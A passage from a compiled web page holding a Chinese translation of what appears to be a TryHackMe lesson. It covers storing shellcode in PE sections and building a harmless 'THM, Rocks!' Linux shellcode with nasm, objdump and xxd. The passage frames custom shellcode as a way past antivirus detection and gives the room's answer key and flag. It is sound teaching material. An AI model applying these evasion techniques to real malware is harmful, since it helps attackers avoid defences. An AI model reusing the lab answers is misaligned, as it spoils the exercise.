shellcode\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5b9a\u4e49\u548c\u521d\u59cb\u5316 shellcode \u53d8\u91cf\uff0c\u6765\u63a7\u5236\u5c06 shellcode \u5b58\u50a8\u5728\u54ea\u4e2a\u6570\u636e\u8282\u533a\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b\u793a\u4f8b\uff0c\u5c55\u793a\u4e86\u5982\u4f55\u5728 PE \u6587\u4ef6\u4e2d\u5b58\u50a8 shellcode\uff1a"}),"\n",(0,l.jsxs)(n.ol,{children:["\n",(0,l.jsxs)(n.li,{children:["\u5c06 shellcode \u5b9a\u4e49\u4e3a\u4e3b\u51fd\u6570\u5185\u7684\u5c40\u90e8\u53d8\u91cf\uff0c\u5c06\u5176\u5b58\u50a8\u5728 ",(0,l.jsx)(n.strong,{children:".TEXT"})," \u8282\u533a\u4e2d\u3002"]}),"\n",(0,l.jsxs)(n.li,{children:["\u5c06 shellcode \u5b9a\u4e49\u4e3a\u5168\u5c40\u53d8\u91cf\uff0c\u5c06\u5176\u5b58\u50a8\u5728 ",(0,l.jsx)(n.strong,{children:".Data"})," \u8282\u533a\u4e2d\u3002"]}),"\n",(0,l.jsxs)(n.li,{children:["\u53e6\u4e00\u79cd\u6280\u672f\u662f\u5c06 shellcode \u4f5c\u4e3a\u539f\u59cb\u4e8c\u8fdb\u5236\u6570\u636e\u5b58\u50a8\u5728\u56fe\u6807\u56fe\u50cf\u4e2d\uff0c\u5e76\u5728\u4ee3\u7801\u4e2d\u94fe\u63a5\u5b83\uff0c\u8fd9\u6837\u5b83\u4f1a\u51fa\u73b0\u5728 ",(0,l.jsx)(n.strong,{children:".rsrc"})," \u6570\u636e\u8282\u533a\u4e2d\u3002"]}),"\n",(0,l.jsx)(n.li,{children:"\u6211\u4eec\u8fd8\u53ef\u4ee5\u6dfb\u52a0\u4e00\u4e2a\u81ea\u5b9a\u4e49\u6570\u636e\u8282\u533a\u6765\u5b58\u50a8 shellcode\u3002"}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"pe-bear",children:"PE-Bear"}),"\n",(0,l.jsx)(n.p,{children:"\u5728\u9644\u5e26\u7684\u865a\u62df\u673a\u4e2d\uff0c\u63d0\u4f9b\u4e86\u4e00\u4e2a Windows \u5f00\u53d1\u73af\u5883\uff0c\u5305\u542b\u4e86\u7528\u4e8e\u89e3\u6790 EXE \u6587\u4ef6\u5e76\u8bfb\u53d6\u6211\u4eec\u8ba8\u8bba\u8fc7\u7684\u8be6\u7ec6\u4fe1\u606f\u7684\u5de5\u5177\u3002\u4e3a\u4e86\u65b9\u4fbf\u60a8\u4f7f\u7528\uff0c\u6211\u4eec\u5df2\u7ecf\u5728\u684c\u9762\u4e0a\u63d0\u4f9b\u4e86 PE-Bear \u8f6f\u4ef6\u7684\u526f\u672c\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u68c0\u67e5 PE \u7ed3\u6784\uff1a\u5934\u90e8\u3001\u8282\u533a\u7b49\u3002PE-Bear \u63d0\u4f9b\u4e86\u4e00\u4e2a\u56fe\u5f62\u7528\u6237\u754c\u9762\uff0c\u5c55\u793a\u6240\u6709\u76f8\u5173\u7684 EXE \u6587\u4ef6\u8be6\u7ec6\u4fe1\u606f\u3002"}),"\n",(0,l.jsxs)(n.p,{children:["\u8981\u52a0\u8f7d EXE \u6587\u4ef6\u8fdb\u884c\u5206\u6790\uff0c\u60a8\u53ef\u4ee5\u9009\u62e9 ",(0,l.jsx)(n.strong,{children:"\u6587\u4ef6"})," -> ",(0,l.jsx)(n.strong,{children:"\u52a0\u8f7d PEs"}),"\uff08Ctrl + O\uff09\u3002"]}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"PE-Bear: The Main Windows",src:s(2669).A+"",width:"607",height:"446"})}),"\n",(0,l.jsx)(n.p,{children:"\u4e00\u65e6\u6587\u4ef6\u52a0\u8f7d\u5b8c\u6210\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u770b\u5230\u6240\u6709\u7684 PE \u8be6\u7ec6\u4fe1\u606f\u3002\u4ee5\u4e0b\u622a\u56fe\u5c55\u793a\u4e86\u52a0\u8f7d\u7684\u6587\u4ef6\u7684 PE \u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u6211\u4eec\u5728\u672c\u4efb\u52a1\u4e2d\u8ba8\u8bba\u8fc7\u7684\u5934\u90e8\u548c\u8282\u533a\u3002"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"PE-Bear a File",src:s(225).A+"",width:"809",height:"466"})}),"\n",(0,l.jsxs)(n.p,{children:["\u73b0\u5728\u662f\u65f6\u5019\u52a8\u624b\u8bd5\u4e00\u8bd5\u4e86\uff01\u52a0\u8f7d ",(0,l.jsx)(n.strong,{children:"thm-intro2PE.exe"})," \u6587\u4ef6\u4ee5\u56de\u7b54\u4e0b\u9762\u7684\u95ee\u9898\u3002\u8be5\u6587\u4ef6\u4f4d\u4e8e\u4ee5\u4e0b\u8def\u5f84\uff1a",(0,l.jsx)(n.code,{children:"c:\\Tools\\PE files\\thm-intro2PE.exe"})]}),"\n",(0,l.jsxs)(n.admonition,{title:"Answer the questions below",type:"info",children:[(0,l.jsx)(n.p,{children:"thm-intro2PE.exe \u6587\u4ef6\u7684 MD5 \u54c8\u5e0c\u503c\u7684\u6700\u540e 6 \u4f4d\u662f\u4ec0\u4e48\uff1f"}),(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"530949\n"})}),(0,l.jsx)(n.p,{children:"thm-intro2PE.exe \u6587\u4ef6\u7684 Magic Number\uff08\u4ee5\u5341\u516d\u8fdb\u5236\u8868\u793a\uff09\u662f\u591a\u5c11\uff1f"}),(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"5A4D\n"})}),(0,l.jsx)(n.p,{children:"thm-intro2PE.exe \u6587\u4ef6\u7684\u5165\u53e3\u70b9\uff08Entry Point\uff09\u503c\u662f\u591a\u5c11\uff1f"}),(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"12E4\n"})}),(0,l.jsx)(n.p,{children:"thm-intro2PE.exe \u6587\u4ef6\u5171\u6709\u591a\u5c11\u4e2a\u8282\uff08Sections\uff09\uff1f"}),(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"7\n"})}),(0,l.jsx)(n.p,{children:"\u81ea\u5b9a\u4e49\u8282\u53ef\u4ee5\u7528\u6765\u5b58\u50a8\u989d\u5916\u6570\u636e\u3002\u6076\u610f\u8f6f\u4ef6\u5f00\u53d1\u8005\u5229\u7528\u8fd9\u4e00\u6280\u672f\u521b\u5efa\u4e00\u4e2a\u5305\u542b\u5176\u6076\u610f\u4ee3\u7801\u7684\u65b0\u8282\uff0c\u5e76\u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b\uff0c\u4f7f\u7a0b\u5e8f\u8df3\u8f6c\u5e76\u6267\u884c\u65b0\u8282\u4e2d\u7684\u5185\u5bb9\u3002\u8be5\u989d\u5916\u8282\u7684\u540d\u79f0\u662f\u4ec0\u4e48\uff1f"}),(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:".flag\n"})}),(0,l.jsx)(n.p,{children:"\u68c0\u67e5\u8be5\u989d\u5916\u8282\u7684\u5185\u5bb9\u3002Flag \u662f\u4ec0\u4e48\uff1f"}),(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"THM{PE-N3w-s3ction!}\n"})})]}),"\n",(0,l.jsx)(n.h2,{id:"introduction-to-shellcode---shellcode-\u7b80\u4ecb",children:"Introduction to Shellcode - Shellcode \u7b80\u4ecb"}),"\n",(0,l.jsx)(n.p,{children:"Shellcode \u662f\u4e00\u7ec4\u7cbe\u5fc3\u7f16\u5199\u7684\u673a\u5668\u7801\u6307\u4ee4\uff0c\u6307\u793a\u6613\u53d7\u653b\u51fb\u7684\u7a0b\u5e8f\u8fd0\u884c\u989d\u5916\u7684\u529f\u80fd\uff0c\u5e76\u4e14\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u63d0\u4f9b\u7cfb\u7edf shell \u7684\u8bbf\u95ee\u6743\u9650\u6216\u521b\u5efa\u4e00\u4e2a\u53cd\u5411\u547d\u4ee4 shell\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u4e00\u65e6 shellcode \u88ab\u6ce8\u5165\u5230\u8fdb\u7a0b\u4e2d\uff0c\u5e76\u7531\u6613\u53d7\u653b\u51fb\u7684\u8f6f\u4ef6\u6216\u7a0b\u5e8f\u6267\u884c\uff0c\u5b83\u5c31\u4f1a\u4fee\u6539\u4ee3\u7801\u7684\u8fd0\u884c\u6d41\u7a0b\uff0c\u66f4\u65b0\u7a0b\u5e8f\u7684\u5bc4\u5b58\u5668\u548c\u529f\u80fd\uff0c\u4ece\u800c\u6267\u884c\u653b\u51fb\u8005\u7684\u4ee3\u7801\u3002"}),"\n",(0,l.jsx)(n.p,{children:"Shellcode \u901a\u5e38\u7528\u6c47\u7f16\u8bed\u8a00\u7f16\u5199\uff0c\u5e76\u8f6c\u6362\u6210\u5341\u516d\u8fdb\u5236\u64cd\u4f5c\u7801\uff08opcode\uff09\u3002\u7f16\u5199\u72ec\u7279\u4e14\u5b9a\u5236\u7684 shellcode \u53ef\u4ee5\u663e\u8457\u5e2e\u52a9\u7ed5\u8fc7\u9632\u75c5\u6bd2\u8f6f\u4ef6\u7684\u68c0\u6d4b\u3002\u4f46\u7f16\u5199\u81ea\u5b9a\u4e49 shellcode \u9700\u8981\u5bf9\u6c47\u7f16\u8bed\u8a00\u6709\u6781\u9ad8\u7684\u77e5\u8bc6\u548c\u6280\u80fd\uff0c\u8fd9\u7edd\u975e\u6613\u4e8b\uff01"}),"\n",(0,l.jsx)(n.p,{children:"\u4e00\u4e2a\u7b80\u5355\u7684 Shellcode\uff01"}),"\n",(0,l.jsx)(n.p,{children:"\u4e3a\u4e86\u5236\u4f5c\u4f60\u81ea\u5df1\u7684 shellcode\uff0c\u9700\u8981\u5177\u5907\u4ee5\u4e0b\u6280\u80fd\uff1a"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u5bf9 x86 \u548c x64 CPU \u67b6\u6784\u6709\u8f83\u597d\u7684\u7406\u89e3\u3002"}),"\n",(0,l.jsx)(n.li,{children:"\u638c\u63e1\u6c47\u7f16\u8bed\u8a00\u3002"}),"\n",(0,l.jsx)(n.li,{children:"\u5bf9 C \u7b49\u7f16\u7a0b\u8bed\u8a00\u6709\u624e\u5b9e\u7684\u77e5\u8bc6\u3002"}),"\n",(0,l.jsx)(n.li,{children:"\u719f\u6089 Linux \u548c Windows \u64cd\u4f5c\u7cfb\u7edf\u3002"}),"\n"]}),"\n",(0,l.jsx)(n.p,{children:'\u8981\u751f\u6210\u6211\u4eec\u81ea\u5df1\u7684 shellcode\uff0c\u6211\u4eec\u9700\u8981\u7f16\u5199\u5e76\u4ece\u6c47\u7f16\u673a\u5668\u7801\u4e2d\u63d0\u53d6\u5b57\u8282\u3002\u5bf9\u4e8e\u672c\u4efb\u52a1\uff0c\u6211\u4eec\u5c06\u4f7f\u7528 AttackBox \u521b\u5efa\u4e00\u4e2a\u7b80\u5355\u7684 Linux shellcode\uff0c\u8be5 shellcode \u7528\u4e8e\u8f93\u51fa\u5b57\u7b26\u4e32 "THM, Rocks!"\u3002\u4e0b\u9762\u7684\u6c47\u7f16\u4ee3\u7801\u4f7f\u7528\u4e86\u4e24\u4e2a\u4e3b\u8981\u51fd\u6570\uff1a'}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u7cfb\u7edf\u5199\u5165\u51fd\u6570\uff08sys_write\uff09\uff0c\u7528\u4e8e\u6253\u5370\u6211\u4eec\u9009\u62e9\u7684\u5b57\u7b26\u4e32\u3002"}),"\n",(0,l.jsx)(n.li,{children:"\u7cfb\u7edf\u9000\u51fa\u51fd\u6570\uff08sys_exit\uff09\uff0c\u7528\u4e8e\u7ec8\u6b62\u7a0b\u5e8f\u6267\u884c\u3002"}),"\n"]}),"\n",(0,l.jsxs)(n.p,{children:["\u8c03\u7528\u8fd9\u4e9b\u51fd\u6570\u65f6\uff0c\u6211\u4eec\u5c06\u4f7f\u7528 ",(0,l.jsx)(n.strong,{children:"syscalls"}),"\u3002syscall \u662f\u7a0b\u5e8f\u8bf7\u6c42\u5185\u6838\u6267\u884c\u67d0\u4e9b\u64cd\u4f5c\u7684\u65b9\u5f0f\u3002\u5728\u672c\u4f8b\u4e2d\uff0c\u6211\u4eec\u5c06\u8bf7\u6c42\u5185\u6838\u5c06\u5b57\u7b26\u4e32\u5199\u5165\u5c4f\u5e55\uff0c\u7136\u540e\u9000\u51fa\u7a0b\u5e8f\u3002\u6bcf\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u5728\u8c03\u7528 syscalls \u65f6\u90fd\u6709\u4e0d\u540c\u7684\u8c03\u7528\u7ea6\u5b9a\uff0c\u8fd9\u610f\u5473\u7740\u5728 Linux \u4e2d\u4f7f\u7528 write \u65f6\uff0c\u53ef\u80fd\u4f1a\u4f7f\u7528\u4e0e Windows \u4e0d\u540c\u7684 syscall\u3002\u5bf9\u4e8e 64 \u4f4d Linux\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u4ee5\u4e0b\u5bc4\u5b58\u5668\u7684\u503c\u6765\u8c03\u7528\u5185\u6838\u4e2d\u7684\u6240\u9700\u51fd\u6570\uff1a"]}),"\n",(0,l.jsxs)(n.table,{children:[(0,l.jsx)(n.thead,{children:(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.th,{children:(0,l.jsx)(n.strong,{children:"rax"})}),(0,l.jsx)(n.th,{children:(0,l.jsx)(n.strong,{children:"\u7cfb\u7edf\u8c03\u7528"})}),(0,l.jsx)(n.th,{children:(0,l.jsx)(n.strong,{children:"rdi"})}),(0,l.jsx)(n.th,{children:(0,l.jsx)(n.strong,{children:"rsi"})}),(0,l.jsx)(n.th,{children:(0,l.jsx)(n.strong,{children:"rdx"})})]})}),(0,l.jsxs)(n.tbody,{children:[(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"0x1"}),(0,l.jsx)(n.td,{children:"sys_write"}),(0,l.jsx)(n.td,{children:"unsigned int fd"}),(0,l.jsx)(n.td,{children:"const char *buf"}),(0,l.jsx)(n.td,{children:"size_t count"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"0x3c"}),(0,l.jsx)(n.td,{children:"sys_exit"}),(0,l.jsx)(n.td,{children:"int error_code"}),(0,l.jsx)(n.td,{}),(0,l.jsx)(n.td,{})]})]})]}),"\n",(0,l.jsxs)(n.p,{children:["\u4e0a\u8868\u544a\u8bc9\u6211\u4eec\uff0c\u4e3a\u4e86\u901a\u8fc7 syscalls \u8c03\u7528 sys_write \u548c sys_exit \u51fd\u6570\uff0c\u9700\u8981\u5728\u4e0d\u540c\u7684\u5904\u7406\u5668\u5bc4\u5b58\u5668\u4e2d\u8bbe\u7f6e\u54ea\u4e9b\u503c\u3002\u5bf9\u4e8e 64 \u4f4d Linux\uff0crax \u5bc4\u5b58\u5668\u7528\u4e8e\u6307\u793a\u6211\u4eec\u5e0c\u671b\u8c03\u7528\u7684\u5185\u6838\u51fd\u6570\u3002\u5c06 rax \u8bbe\u7f6e\u4e3a 0x1 \u4f1a\u8ba9\u5185\u6838\u6267\u884c sys_write\uff0c\u800c\u5c06 rax \u8bbe\u7f6e\u4e3a 0x3c \u5219\u4f1a\u8ba9\u5185\u6838\u6267\u884c sys_exit\u3002\u6bcf\u4e2a\u51fd\u6570\u90fd\u9700\u8981\u4e00\u4e9b\u53c2\u6570\uff0c\u8fd9\u4e9b\u53c2\u6570\u53ef\u4ee5\u901a\u8fc7 rdi\u3001rsi \u548c rdx \u5bc4\u5b58\u5668\u8bbe\u7f6e\u3002\u4f60\u53ef\u4ee5\u5728",(0,l.jsx)(n.a,{href:"https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/",children:"\u8fd9\u91cc"}),"\u627e\u5230\u5b8c\u6574\u7684 64 \u4f4d Linux syscalls \u53c2\u8003\u3002"]}),"\n",(0,l.jsxs)(n.p,{children:["\u5bf9\u4e8e ",(0,l.jsx)(n.code,{children:"sys_write"}),"\uff0c\u901a\u8fc7 ",(0,l.jsx)(n.code,{children:"rdi"})," \u4f20\u9012\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u8981\u5199\u5165\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u3002",(0,l.jsx)(n.code,{children:"rsi"})," \u4e2d\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u6307\u5411\u6211\u4eec\u8981\u6253\u5370\u7684\u5b57\u7b26\u4e32\u7684\u6307\u9488\uff0c\u800c ",(0,l.jsx)(n.code,{children:"rdx"})," \u4e2d\u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u8981\u6253\u5370\u5b57\u7b26\u4e32\u7684\u5927\u5c0f\u3002"]}),"\n",(0,l.jsxs)(n.p,{children:["\u5bf9\u4e8e ",(0,l.jsx)(n.code,{children:"sys_exit"}),"\uff0crdi \u9700\u8981\u8bbe\u7f6e\u4e3a\u7a0b\u5e8f\u7684\u9000\u51fa\u7801\u3002\u6211\u4eec\u5c06\u4f7f\u7528\u9000\u51fa\u7801 0\uff0c\u8868\u793a\u7a0b\u5e8f\u6210\u529f\u9000\u51fa\u3002"]}),"\n",(0,l.jsxs)(n.p,{children:["\u8bf7\u5c06\u4ee5\u4e0b\u4ee3\u7801\u590d\u5236\u5230\u4f60\u7684 AttackBox \u4e2d\uff0c\u4fdd\u5b58\u4e3a\u6587\u4ef6 ",(0,l.jsx)(n.code,{children:"thm.asm"}),"\uff1a"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-asm",children:'global _start\r\n\r\nsection .text\r\n_start:\r\n    jmp MESSAGE      ; 1) let\'s jump to MESSAGE\r\n\r\nGOBACK:\r\n    mov rax, 0x1\r\n    mov rdi, 0x1\r\n    pop rsi          ; 3) we are popping into `rsi`; now we have the\r\n                     ; address of "THM, Rocks!\\r\\n"\r\n    mov rdx, 0xd\r\n    syscall\r\n\r\n    mov rax, 0x3c\r\n    mov rdi, 0x0\r\n    syscall\r\n\r\nMESSAGE:\r\n    call GOBACK       ; 2) we are going back, since we used `call`, that means\r\n                      ; the return address, which is, in this case, the address\r\n                      ; of "THM, Rocks!\\r\\n", is pushed into the stack.\r\n    db "THM, Rocks!", 0dh, 0ah\n'})}),"\n",(0,l.jsxs)(n.p,{children:["\u8ba9\u6211\u4eec\u8fdb\u4e00\u6b65\u89e3\u91ca\u4e00\u4e0b ASM \u4ee3\u7801\u3002\u9996\u5148\uff0c\u6211\u4eec\u7684\u6d88\u606f\u5b57\u7b26\u4e32\u5b58\u50a8\u5728 .text \u6bb5\u7684\u672b\u5c3e\u3002\u7531\u4e8e\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u6307\u9488\u6307\u5411\u8fd9\u4e2a\u6d88\u606f\u4ee5\u4fbf\u6253\u5370\uff0c\u6211\u4eec\u4f1a\u8df3\u8f6c\u5230\u8c03\u7528\u6307\u4ee4\u7684\u4f4d\u7f6e\uff0c\u800c\u8fd9\u4e2a\u4f4d\u7f6e\u5728\u6d88\u606f\u672c\u8eab\u4e4b\u524d\u3002\u5f53\u6267\u884c ",(0,l.jsx)(n.code,{children:"call GOBACK"})," \u65f6\uff0c\u7d27\u63a5\u7740 ",(0,l.jsx)(n.code,{children:"call"})," \u6307\u4ee4\u540e\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u4f1a\u88ab\u63a8\u5165\u6808\u4e2d\uff0c\u8fd9\u4e2a\u5730\u5740\u5bf9\u5e94\u7740\u6211\u4eec\u7684\u6d88\u606f\u4f4d\u7f6e\u3002\u6ce8\u610f\uff0c\u6d88\u606f\u7ed3\u5c3e\u5904\u7684 0dh \u548c 0ah \u662f\u6362\u884c\u7b26 (\\r\\n) \u7684\u4e8c\u8fdb\u5236\u7b49\u6548\u3002"]}),"\n",(0,l.jsx)(n.p,{children:"\u63a5\u4e0b\u6765\uff0c\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c GOBACK \u4f8b\u7a0b\uff0c\u5e76\u4e3a\u6211\u4eec\u7b2c\u4e00\u4e2a sys_write() \u51fd\u6570\u51c6\u5907\u6240\u9700\u7684\u5bc4\u5b58\u5668\u3002"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u6211\u4eec\u901a\u8fc7\u5c06 1 \u5b58\u50a8\u5230 rax \u5bc4\u5b58\u5668\u6765\u6307\u5b9a sys_write \u51fd\u6570\u3002"}),"\n",(0,l.jsx)(n.li,{children:"\u6211\u4eec\u5c06 rdi \u8bbe\u7f6e\u4e3a 1\uff0c\u4ee5\u4fbf\u5c06\u5b57\u7b26\u4e32\u8f93\u51fa\u5230\u7528\u6237\u7684\u63a7\u5236\u53f0\uff08STDOUT\uff09\u3002"}),"\n",(0,l.jsx)(n.li,{children:"\u6211\u4eec\u4ece\u6808\u4e2d\u5f39\u51fa\u6307\u5411\u5b57\u7b26\u4e32\u7684\u6307\u9488\uff08\u5728\u8c03\u7528 GOBACK \u65f6\u5df2\u7ecf\u88ab\u63a8\u5165\u6808\u4e2d\uff09\uff0c\u5e76\u5c06\u5176\u5b58\u50a8\u5230 rsi \u5bc4\u5b58\u5668\u4e2d\u3002"}),"\n",(0,l.jsx)(n.li,{children:"\u901a\u8fc7 syscall \u6307\u4ee4\uff0c\u6211\u4eec\u4f7f\u7528\u51c6\u5907\u597d\u7684\u503c\u6267\u884c sys_write \u51fd\u6570\u3002"}),"\n",(0,l.jsx)(n.li,{children:"\u5bf9\u4e8e\u4e0b\u4e00\u90e8\u5206\uff0c\u6211\u4eec\u505a\u76f8\u540c\u7684\u64cd\u4f5c\u6765\u8c03\u7528 sys_exit \u51fd\u6570\uff0c\u56e0\u6b64\u6211\u4eec\u5c06 0x3c \u5b58\u50a8\u5230 rax \u5bc4\u5b58\u5668\uff0c\u5e76\u8c03\u7528 syscall \u51fd\u6570\u9000\u51fa\u7a0b\u5e8f\u3002"}),"\n"]}),"\n",(0,l.jsx)(n.p,{children:"\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u7f16\u8bd1\u5e76\u94fe\u63a5 ASM \u4ee3\u7801\uff0c\u521b\u5efa\u4e00\u4e2a x64 Linux \u53ef\u6267\u884c\u6587\u4ef6\uff0c\u6700\u540e\u6267\u884c\u7a0b\u5e8f\u3002"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:"user@AttackBox$ nasm -f elf64 thm.asm\r\nuser@AttackBox$ ld thm.o -o thm\r\nuser@AttackBox$ ./thm\r\nTHM,Rocks!\n"})}),"\n",(0,l.jsxs)(n.p,{children:["\u6211\u4eec\u4f7f\u7528 ",(0,l.jsx)(n.code,{children:"nasm"})," \u547d\u4ee4\u6765\u7f16\u8bd1 ASM \u6587\u4ef6\uff0c\u6307\u5b9a ",(0,l.jsx)(n.code,{children:"-f elf64"})," \u9009\u9879\u8868\u793a\u6211\u4eec\u662f\u5728\u4e3a 64 \u4f4d Linux \u7f16\u8bd1\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7f16\u8bd1\u540e\u4f1a\u751f\u6210\u4e00\u4e2a ",(0,l.jsx)(n.code,{children:".o"})," \u6587\u4ef6\uff0c\u5b83\u5305\u542b\u4e86\u76ee\u6807\u4ee3\u7801\uff0c\u9700\u8981\u94fe\u63a5\u624d\u80fd\u6210\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\u3002",(0,l.jsx)(n.code,{children:"ld"})," \u547d\u4ee4\u7528\u4e8e\u94fe\u63a5\u76ee\u6807\u6587\u4ef6\uff0c\u751f\u6210\u6700\u7ec8\u7684\u53ef\u6267\u884c\u6587\u4ef6\u3002",(0,l.jsx)(n.code,{children:"-o"})," \u9009\u9879\u7528\u4e8e\u6307\u5b9a\u8f93\u51fa\u7684\u53ef\u6267\u884c\u6587\u4ef6\u540d\u79f0\u3002"]}),"\n",(0,l.jsxs)(n.p,{children:["\u73b0\u5728\uff0c\u6211\u4eec\u5df2\u7ecf\u83b7\u5f97\u4e86\u7f16\u8bd1\u597d\u7684 ASM \u7a0b\u5e8f\uff0c\u63a5\u4e0b\u6765\u4f7f\u7528 ",(0,l.jsx)(n.code,{children:"objdump"})," \u547d\u4ee4\u63d0\u53d6 shellcode\uff0c\u901a\u8fc7\u8f6c\u50a8\u7f16\u8bd1\u540e\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684 ",(0,l.jsx)(n.code,{children:".text"})," \u6bb5\u3002"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-asm",children:"user@AttackBox$ objdump -d thm\r\n\r\nthm:     file format elf64-x86-64\r\n\r\n\r\nDisassembly of section .text:\r\n\r\n0000000000400080 <_start>:\r\n  400080:\teb 1e                \tjmp    4000a0 \r\n\r\n0000000000400082 :\r\n  400082:\tb8 01 00 00 00       \tmov    $0x1,%eax\r\n  400087:\tbf 01 00 00 00       \tmov    $0x1,%edi\r\n  40008c:\t5e                   \tpop    %rsi\r\n  40008d:\tba 0d 00 00 00       \tmov    $0xd,%edx\r\n  400092:\t0f 05                \tsyscall \r\n  400094:\tb8 3c 00 00 00       \tmov    $0x3c,%eax\r\n  400099:\tbf 00 00 00 00       \tmov    $0x0,%edi\r\n  40009e:\t0f 05                \tsyscall \r\n\r\n00000000004000a0 :\r\n  4000a0:\te8 dd ff ff ff       \tcallq  400082 \r\n  4000a5:\t54                   \tpush   %rsp\r\n  4000a6:\t48                   \trex.W\r\n  4000a7:\t4d 2c 20             \trex.WRB sub $0x20,%al\r\n  4000aa:\t52                   \tpush   %rdx\r\n  4000ab:\t6f                   \toutsl  %ds:(%rsi),(%dx)\r\n  4000ac:\t63 6b 73             \tmovslq 0x73(%rbx),%ebp\r\n  4000af:\t21                   \t.byte 0x21\r\n  4000b0:\t0d                   \t.byte 0xd\r\n  4000b1:\t0a                   \t.byte 0xa\n"})}),"\n",(0,l.jsxs)(n.p,{children:["\u73b0\u5728\u6211\u4eec\u9700\u8981\u4ece\u4e0a\u8ff0\u8f93\u51fa\u4e2d\u63d0\u53d6\u5341\u516d\u8fdb\u5236\u503c\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 ",(0,l.jsx)(n.code,{children:"objcopy"})," \u5c06 ",(0,l.jsx)(n.code,{children:".text"})," \u90e8\u5206\u8f6c\u50a8\u5230\u4e00\u4e2a\u540d\u4e3a ",(0,l.jsx)(n.code,{children:"thm.text"})," \u7684\u65b0\u6587\u4ef6\u4e2d\uff0c\u683c\u5f0f\u4e3a\u4e8c\u8fdb\u5236\uff0c\u64cd\u4f5c\u5982\u4e0b\uff1a"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"user@AttackBox$ objcopy -j .text -O binary thm thm.text\n"})}),"\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.code,{children:"thm.text"})," \u6587\u4ef6\u5305\u542b\u4e86\u6211\u4eec\u4ee5\u4e8c\u8fdb\u5236\u683c\u5f0f\u5b58\u50a8\u7684 shellcode\uff0c\u56e0\u6b64\uff0c\u4e3a\u4e86\u80fd\u591f\u4f7f\u7528\u5b83\uff0c\u6211\u4eec\u9700\u8981\u5148\u5c06\u5176\u8f6c\u6362\u4e3a\u5341\u516d\u8fdb\u5236\u3002",(0,l.jsx)(n.code,{children:"xxd"})," \u547d\u4ee4\u5177\u6709 ",(0,l.jsx)(n.code,{children:"-i"})," \u9009\u9879\uff0c\u53ef\u4ee5\u76f4\u63a5\u5c06\u4e8c\u8fdb\u5236\u6587\u4ef6\u8f93\u51fa\u4e3a C \u5b57\u7b26\u4e32\u683c\u5f0f\uff0c\u5982\u4e0b\u6240\u793a\uff1a"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"user@AttackBox$ xxd -i thm.text\r\nunsigned char new_text[] = {\r\n  0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,\r\n  0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,\r\n  0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,\r\n  0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21,\r\n  0x0d, 0x0a\r\n};\r\nunsigned int new_text_len = 50;\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u6700\u540e\uff0c\u6211\u4eec\u5f97\u5230\u4e86\u683c\u5f0f\u5316\u7684 shellcode\uff0c\u5b83\u6765\u81ea\u6211\u4eec\u7684 ASM \u6c47\u7f16\u4ee3\u7801\u3002\u771f\u6709\u8da3\uff01\u6b63\u5982\u6211\u4eec\u6240\u89c1\uff0c\u751f\u6210 shellcode 